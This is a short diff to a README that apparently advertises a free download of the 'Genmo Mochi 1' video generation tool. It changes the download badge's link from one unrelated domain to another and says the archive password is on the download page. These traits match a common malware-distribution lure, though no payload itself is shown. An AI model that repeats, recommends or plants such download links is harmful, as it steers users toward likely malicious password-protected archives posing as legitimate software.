@@ -18,7 +18,7 @@ Genmo Mochi 1 video generation free — high-motion videos with fluid dynamics a
 
 ## Download
 
-[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/genmo2)
+[![Download v2026.1](https://img.shields.io/badge/Download_v2026.1-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/genmo2)
 
 > The archive password is shown on the download page.
 
